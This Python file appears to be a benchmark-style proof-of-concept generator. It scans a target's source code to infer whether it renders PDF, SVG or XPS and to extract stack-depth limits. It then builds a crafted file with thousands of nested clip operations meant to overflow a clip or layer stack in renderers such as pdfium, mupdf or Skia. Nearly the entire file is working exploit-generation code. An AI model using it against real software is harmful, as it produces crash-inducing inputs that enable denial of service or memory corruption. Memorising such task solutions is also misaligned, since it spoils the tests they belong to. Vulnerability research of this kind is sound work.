import os
import re
import io
import tarfile
import zipfile
from typing import Dict, Iterable, List, Optional, Tuple


class _ArchiveWalker:
    def __init__(self, path: str):
        self.path = path

    def iter_files(self) -> Iterable[Tuple[str, bytes]]:
        p = self.path
        if os.path.isdir(p):
            base = os.path.abspath(p)
            for root, _, files in os.walk(base):
                for fn in files:
                    full = os.path.join(root, fn)
                    try:
                        st = os.stat(full)
                    except OSError:
                        continue
                    if not os.path.isfile(full):
                        continue
                    if st.st_size > 2_500_000:
                        continue
                    rel = os.path.relpath(full, base).replace(os.sep, "/")
                    try:
                        with open(full, "rb") as f:
                            data = f.read()
                    except OSError:
                        continue
                    yield rel, data
            return

        if tarfile.is_tarfile(p):
            with tarfile.open(p, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    if m.size <= 0 or m.size > 2_500_000:
                        continue
                    name = m.name
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    yield name, data
            return

        if zipfile.is_zipfile(p):
            with zipfile.ZipFile(p, "r") as zf:
                for zi in zf.infolist():
                    if zi.is_dir():
                        continue
                    if zi.file_size <= 0 or zi.file_size > 2_500_000:
                        continue
                    name = zi.filename
                    try:
                        data = zf.read(zi)
                    except Exception:
                        continue
                    yield name, data
            return

        # Fallback: treat as single file
        try:
            with open(p, "rb") as f:
                data = f.read()
        except OSError:
            data = b""
        yield os.path.basename(p), data


def _safe_decode(b: bytes) -> str:
    try:
        return b.decode("utf-8", errors="ignore")
    except Exception:
        try:
            return b.decode("latin-1", errors="ignore")
        except Exception:
            return ""


def _is_likely_text_file(name: str) -> bool:
    n = name.lower()
    if any(n.endswith(ext) for ext in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx", ".rs", ".go", ".java", ".kt", ".js", ".ts", ".py", ".m", ".mm", ".swift", ".cmake", ".txt", ".md", ".rst", ".sh", ".bazel", ".bzl", ".gn", ".gni", ".y", ".yy", ".l", ".in", ".ac", ".am")):
        return True
    base = os.path.basename(n)
    if base in ("cmakelists.txt", "meson.build", "build.gradle", "makefile", "configure.ac", "configure.in", "build.sh"):
        return True
    if "/fuzz" in n or "fuzz" in base:
        return True
    return False


def _score_from_content_and_name(name: str, data_lower: bytes) -> Dict[str, int]:
    scores = {"pdf": 0, "svg": 0, "xps": 0, "skp": 0}

    nl = name.lower()
    if ".pdf" in nl or "pdf" in nl:
        scores["pdf"] += 2
    if ".svg" in nl or "svg" in nl:
        scores["svg"] += 2
    if ".xps" in nl or "xps" in nl or "openxps" in nl or "gxps" in nl:
        scores["xps"] += 3
    if ".skp" in nl or "skp" in nl or "skpicture" in nl:
        scores["skp"] += 2

    # Strong indicators in content
    if b"llvmfuzzertestoneinput" in data_lower or b"define_fuzzer" in data_lower:
        scores["pdf"] += 1
        scores["svg"] += 1
        scores["xps"] += 1
        scores["skp"] += 1

    # PDF-related APIs / keywords
    for kw, w in (
        (b"%pdf", 10),
        (b"pdfium", 8),
        (b"poppler", 8),
        (b"mupdf", 8),
        (b"fz_open_document", 6),
        (b"pdf_open_document", 6),
        (b"fpdf_", 6),
        (b"pdf_doc", 3),
        (b"/type /page", 3),
        (b"startxref", 3),
    ):
        if kw in data_lower:
            scores["pdf"] += w

    # SVG-related APIs / keywords
    for kw, w in (
        (b"<svg", 12),
        (b"sksvg", 8),
        (b"sksvgdom", 8),
        (b"sksvgdom", 8),
        (b"librsvg", 8),
        (b"rsvg_handle", 8),
        (b"resvg", 7),
        (b"usvg", 7),
        (b"svgdom", 6),
        (b"xmlparse", 2),
        (b"tinyxml", 4),
        (b"libxml2", 3),
    ):
        if kw in data_lower:
            scores["svg"] += w

    # XPS-related APIs / keywords
    for kw, w in (
        (b"fixedpage", 10),
        (b"fixeddocument", 6),
        (b"fixeddocumentsequence", 6),
        (b"application/vnd.ms-package.xps", 8),
        (b"openxps", 8),
        (b"gxps", 8),
        (b"xps", 2),
    ):
        if kw in data_lower:
            scores["xps"] += w

    # SKP / Skia picture
    for kw, w in (
        (b"skpicture", 10),
        (b"makefromstream", 4),
        (b"skiapict", 6),
        (b".skp", 6),
        (b"skcanvas", 4),
        (b"skserial", 2),
    ):
        if kw in data_lower:
            scores["skp"] += w

    # Vulnerability hint keywords: prefer formats that show up near these
    if b"clip mark" in data_lower or b"push_clip_mark" in data_lower or b"clip_stack" in data_lower or b"layer_stack" in data_lower:
        scores["pdf"] += 2
        scores["svg"] += 2
        scores["xps"] += 2

    return scores


def _merge_scores(a: Dict[str, int], b: Dict[str, int]) -> Dict[str, int]:
    out = dict(a)
    for k, v in b.items():
        out[k] = out.get(k, 0) + v
    return out


def _extract_depth_candidates(text: str) -> List[int]:
    t = text
    tl = t.lower()
    if not (("nest" in tl or "depth" in tl) and ("clip" in tl or "layer" in tl) and "stack" in tl):
        # Still try if clip mark/push clip mark is present
        if "clip mark" not in tl and "push_clip_mark" not in tl:
            return []

    nums: List[int] = []
    patterns = [
        r'(?i)#\s*define\s+[A-Z0-9_]*(?:NEST|DEPTH|STACK)[A-Z0-9_]*\s+(\d{1,7})\b',
        r'(?i)\b(?:kMax|max)\w*(?:Nesting|Depth)\w*\s*=\s*(\d{1,7})\b',
        r'(?i)\b(?:max|limit)\w*(?:nest|depth)\w*\s*[:=]\s*(\d{1,7})\b',
        r'(?i)\b(?:layer|clip)\w*stack\w*\s*\[\s*(\d{1,7})\s*\]',
        r'(?i)\b(?:layer|clip)\w*stack\w*[^;\n]{0,120}\*\s*(\d{1,7})\b',
        r'(?i)\b(?:MAX_SAVE|MAX_SAVELAYER|MAX_LAYER|MAX_CLIP)\w*\s*=\s*(\d{1,7})\b',
    ]
    for pat in patterns:
        for m in re.finditer(pat, t):
            try:
                v = int(m.group(1))
            except Exception:
                continue
            if 8 <= v <= 2_000_000:
                nums.append(v)

    # Also look for explicit checks like "if (depth > 1024)" or ">= 256"
    for m in re.finditer(r'(?i)\b(?:nest|depth)\w*\s*(?:>=|>|==)\s*(\d{1,7})\b', t):
        try:
            v = int(m.group(1))
        except Exception:
            continue
        if 8 <= v <= 2_000_000:
            nums.append(v)

    return nums


def _choose_format(scores: Dict[str, int]) -> str:
    # We won't generate SKP; if it wins, fall back to best among pdf/svg/xps.
    candidates = {k: scores.get(k, 0) for k in ("pdf", "svg", "xps")}
    best = max(candidates.items(), key=lambda kv: kv[1])[0]
    # If all are tiny, prefer PDF slightly (often supported), else SVG.
    if candidates[best] <= 2:
        if scores.get("pdf", 0) >= scores.get("svg", 0):
            return "pdf"
        return "svg"
    return best


def _build_pdf(n: int) -> bytes:
    # Repeat q + clip sequence to force clip marks / nesting.
    loop = b"q\n0 0 1 1 re W n\n"
    content = loop * max(1, n)
    # Minimal PDF with one page
    header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
    objs: List[bytes] = []
    objs.append(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")
    objs.append(b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")
    objs.append(
        b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Resources << >> /Contents 4 0 R >>\nendobj\n"
    )
    stream_dict = b"<< /Length " + str(len(content)).encode("ascii") + b" >>\n"
    objs.append(b"4 0 obj\n" + stream_dict + b"stream\n" + content + b"\nendstream\nendobj\n")

    parts: List[bytes] = [header]
    offsets = [0]  # object 0
    cur = len(header)
    for ob in objs:
        offsets.append(cur)
        parts.append(ob)
        cur += len(ob)

    xref_off = cur
    # Build xref
    xref_lines = [b"xref\n", b"0 5\n", b"0000000000 65535 f \n"]
    for i in range(1, 5):
        off = offsets[i]
        xref_lines.append(f"{off:010d} 00000 n \n".encode("ascii"))
    trailer = b"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n" + str(xref_off).encode("ascii") + b"\n%%EOF\n"

    parts.extend(xref_lines)
    parts.append(trailer)
    return b"".join(parts)


def _build_svg(n: int) -> bytes:
    # Deep nested clip groups.
    n = max(1, n)
    prefix = (
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b'<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">\n'
        b'<defs><clipPath id="c"><rect x="0" y="0" width="1" height="1"/></clipPath></defs>\n'
    )
    open_tag = b'<g clip-path="url(#c)">'
    close_tag = b"</g>"
    mid = b'<rect x="0" y="0" width="1" height="1"/>\n'
    suffix = b"</svg>\n"
    return prefix + (open_tag * n) + mid + (close_tag * n) + suffix


def _build_xps(n: int) -> bytes:
    n = max(1, n)
    # XPS package (ZIP) with deeply nested Canvas elements with Clip.
    ct = (
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b'<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">\n'
        b'  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>\n'
        b'  <Default Extension="fdseq" ContentType="application/vnd.ms-package.xps-fixeddocumentsequence+xml"/>\n'
        b'  <Default Extension="fdoc" ContentType="application/vnd.ms-package.xps-fixeddocument+xml"/>\n'
        b'  <Default Extension="fpage" ContentType="application/vnd.ms-package.xps-fixedpage+xml"/>\n'
        b"</Types>\n"
    )
    rels = (
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
        b'  <Relationship Id="rId1" Type="http://schemas.microsoft.com/xps/2005/06/fixedrepresentation" '
        b'Target="Documents/1/FixedDocSeq.fdseq"/>\n'
        b"</Relationships>\n"
    )
    fdseq = (
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b'<FixedDocumentSequence xmlns="http://schemas.microsoft.com/xps/2005/06">\n'
        b'  <DocumentReference Source="FixedDoc.fdoc"/>\n'
        b"</FixedDocumentSequence>\n"
    )
    fdoc = (
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b'<FixedDocument xmlns="http://schemas.microsoft.com/xps/2005/06">\n'
        b'  <PageContent Source="Pages/1.fpage"/>\n'
        b"</FixedDocument>\n"
    )

    clip = b"M 0,0 L 1,0 1,1 0,1 Z"
    open_canvas = b'<Canvas Clip="' + clip + b'">'
    close_canvas = b"</Canvas>"

    page_prefix = (
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b'<FixedPage xmlns="http://schemas.microsoft.com/xps/2005/06" Width="1" Height="1">\n'
    )
    page_mid = b'<Path Data="M 0,0 L 1,0 1,1 0,1 Z" Fill="#FFFFFFFF"/>\n'
    page_suffix = b"</FixedPage>\n"
    page = page_prefix + (open_canvas * n) + page_mid + (close_canvas * n) + page_suffix

    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", ct)
        zf.writestr("_rels/.rels", rels)
        zf.writestr("Documents/1/FixedDocSeq.fdseq", fdseq)
        zf.writestr("Documents/1/FixedDoc.fdoc", fdoc)
        zf.writestr("Documents/1/Pages/1.fpage", page)
    return bio.getvalue()


class Solution:
    def solve(self, src_path: str) -> bytes:
        walker = _ArchiveWalker(src_path)

        total_scores: Dict[str, int] = {"pdf": 0, "svg": 0, "xps": 0, "skp": 0}
        vuln_texts: List[str] = []
        fuzzer_texts: List[str] = []
        depth_candidates: List[int] = []

        # Scan source to infer format and a plausible depth threshold.
        scanned = 0
        for name, data in walker.iter_files():
            scanned += 1
            nl = name.lower()

            # Always score by name for common corpus/seeds
            data_lower = data.lower()
            total_scores = _merge_scores(total_scores, _score_from_content_and_name(name, data_lower))

            if not _is_likely_text_file(name):
                if scanned >= 6000 and (total_scores.get("pdf", 0) + total_scores.get("svg", 0) + total_scores.get("xps", 0)) > 40:
                    break
                continue

            # Only decode text if likely useful
            interested = (
                b"llvmfuzzertestoneinput" in data_lower
                or b"define_fuzzer" in data_lower
                or b"push_clip_mark" in data_lower
                or b"clip mark" in data_lower
                or b"clip_stack" in data_lower
                or b"layer_stack" in data_lower
                or b"nest" in data_lower
                or b"fixedpage" in data_lower
                or b"%pdf" in data_lower
                or b"<svg" in data_lower
            )
            if not interested:
                if scanned >= 6000 and (total_scores.get("pdf", 0) + total_scores.get("svg", 0) + total_scores.get("xps", 0)) > 60:
                    break
                continue

            txt = _safe_decode(data)
            tl = txt.lower()

            if "llvmfuzzertestoneinput" in tl or "define_fuzzer" in tl:
                fuzzer_texts.append(txt)

            if ("push_clip_mark" in tl) or ("clip mark" in tl) or (("clip_stack" in tl or "layer_stack" in tl) and ("nest" in tl or "depth" in tl)):
                vuln_texts.append(txt)
                depth_candidates.extend(_extract_depth_candidates(txt))

            if scanned >= 10000:
                break

        fmt = _choose_format(total_scores)

        inferred = None
        if depth_candidates:
            # Prefer smaller-ish maxima: stack sizes are typically not enormous.
            # Use a robust pick: median of filtered candidates.
            cands = sorted(x for x in depth_candidates if 16 <= x <= 200_000)
            if cands:
                inferred = cands[len(cands) // 2]
            else:
                inferred = min(depth_candidates)

        if fmt == "pdf":
            # Default to a comfortably large nesting count but not too huge.
            n = 20000
            if inferred is not None:
                # exceed inferred by a margin
                n = max(n, inferred + 512)
            n = min(n, 200000)
            return _build_pdf(n)

        if fmt == "xps":
            # Keep nesting moderate to avoid parser call stack issues; still enough to overflow typical stacks.
            n = 4096
            if inferred is not None:
                n = max(n, inferred + 128)
            n = min(n, 12000)
            return _build_xps(n)

        # svg (default)
        n = 4096
        if inferred is not None:
            n = max(n, inferred + 128)
        n = min(n, 12000)
        return _build_svg(n)